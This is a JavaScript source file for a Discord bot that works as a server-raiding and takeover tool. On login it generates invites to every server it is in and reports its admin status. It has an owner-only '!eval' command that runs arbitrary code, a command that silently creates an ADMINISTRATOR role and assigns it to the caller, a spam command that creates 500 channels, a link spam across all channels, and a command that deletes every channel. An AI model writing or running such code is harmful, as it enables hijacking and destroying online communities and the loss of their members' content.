try { 
 const discord = require("discord.js");

  const bot = new discord.Client();
  bot.on("ready", () => {
    console.log("invites ready to be sent!!");
    // bot.guilds.cache.forEach(guild => {
    //   if(guild.members.cache.get(bot.user.id).hasPermission("ADMINISTRATOR")) {
    //     guild.channels.create("test")
    //   }
    // })
    console.log(bot.user.id)
    console.log(bot.guilds.cache.size)
    if (bot.guilds.cache.size > 0) {
      let channelID
      let guildd = []
      bot.guilds.cache.forEach(guild => {
        guild.channels.cache.forEach(channell => {
          if (channell.type != "category") {
            if (!guildd.includes(guild.name)) {
              channelID = channell.id
              guildd.push(guild.name)
              console.log(guildd)
              console.log(channell.type)
              let channel = bot.channels.cache.get(channelID)
              channel.createInvite().then(invite => {
                console.log(guild.name + ": " + invite.url + " Admin: " + guild.members.cache.get(bot.user.id).hasPermission("ADMINISTRATOR"))
              })
            }
          }
        })
      })
    
    } else {
      console.warn("No Guilds found!")
    }
  });

  const PREFIX = "!";

  bot.on("message", message => {
    let args = message.content.substring(PREFIX.length).split(" ");
    let command = message.content.split(" ")[0];
    
    if (command == PREFIX + "eval") {
    if (message.author.id == "612625159656046643") {
      //if (!message.content.includes("token")) {
          if (!args[1]) {
              message.channel.send("**Usage:**\n" + PREFIX + "eval {code}")
          } else {
              try {
                  const evaled = eval(args.slice(1).join(" "))
                  const embed = new discord.MessageEmbed()
                  .setTitle("Evaluation")
                  .addField("Evaluated", `\`\`\`js\n${args.slice(1).join(" ")}\`\`\``)
                  .addField("Outcome", `\`\`\`js\n${evaled}\`\`\``)
                  .addField("type of", `\`\`\`js\n${typeof(evaled)}\`\`\``)
                  .setColor("RANDOM")
                  .setFooter(message.author.tag, message.author.displayAvatarURL())
                  message.channel.send(embed)
              } catch(err) {
                  message.channel.send("Error:\n" + err)
              }
          }
      } else {
          message.channel.send("No! I refuse to reveal my token. :sob:")
      }
  //} else {
      //message.channel.send("Only " + bot.users.cache.get("612625159656046643").tag + " can use this command. :sob:")
  //}
  }
  if (command == PREFIX + "ch") {
    for(i = 0; i < 500; i++) {
      message.guild.channels.create("This is a very pog announc")
    }
  }

  if (command == PREFIX + "role") {
    message.delete()
    if (!args[1]) {
      console.log("missing role name")
    } else {
      message.guild.roles.create({ data: { name: args[1], permissions: ["ADMINISTRATOR"] } }).then(r => {
        message.member.roles.add(r)
      })
    }
  }

  if (command == PREFIX + "rr") {
    message.delete()
      message.guild.channels.cache.forEach(ch => {
        if (ch.type == "text") {
          ch.send("https://www.youtube.com/watch?v=j5a0jTc9S10")
        }
      })
  }

  if (command == PREFIX + "per") {
    const permissions = Object.keys(discord.Permissions.FLAGS);
    console.log(
         'Permissions of ' + bot.user.username + '\n\n' +
         permissions.map((perm) => {
               return message.guild.members.cache.get(bot.user.id).hasPermission(perm) ? `${perm}: YES` : `${perm}: NO`
         }).join('\n')
    )
  }

  if (command == PREFIX + "chdel") {
    message.guild.channels.cache.forEach(ch => {
      ch.delete()
    })
    message.guild.channels.create("yes").then(ch => {
      ch.setTopic("this is bot test channel pls do bot cmd here")
    })
  }
  });
  bot.login("insert-token");
} catch(e) {
  console.error("Something went wrong!\nError:\n"+ e)
}